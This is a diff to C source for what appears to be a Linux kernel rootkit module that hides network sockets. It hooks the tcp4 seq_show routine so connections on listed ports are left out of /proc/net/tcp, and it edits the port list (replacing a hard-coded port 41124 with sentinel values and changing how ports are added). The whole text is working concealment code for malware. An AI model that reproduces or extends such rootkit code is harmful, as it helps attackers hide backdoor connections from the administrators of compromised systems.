@@ -8,8 +8,8 @@
 #include "sockhide.h"
 
 port_list_t hidden_ports = {
-    .port  = 41124,
-    .proto = tcp4,
+    .port  = -1,
+    .proto = -1,
     .prev = NULL,
     .next = NULL,
 };
@@ -78,7 +78,7 @@ unhook_show(void)
 void 
 hide_port(port_t port, proto proto)
 {
-    add_port_to_list(&hidden_ports, port, proto);
+    add_port_to_list(hidden_ports_tail, port, proto);
 }
 
 void
@@ -97,7 +97,7 @@ port_list_t_ptr
 find_port_in_list(port_list_t_ptr head, port_t port, proto proto)
 {
     port_list_t_ptr i;
-    for (i = head; i; i = i->next)
+    for (i = head; i; i = i->next) 
         if (i->port == port && i->proto == proto)
             return i;
 
@@ -166,7 +166,7 @@ g7_tcp4_seq_show(struct seq_file *seq, void *v)
     if(list_contains_port(&hidden_ports, src, tcp4)
     || list_contains_port(&hidden_ports, dst, tcp4))
         return 0;
-    
+
     return tcp4_seq_show(seq, v);
 }
 
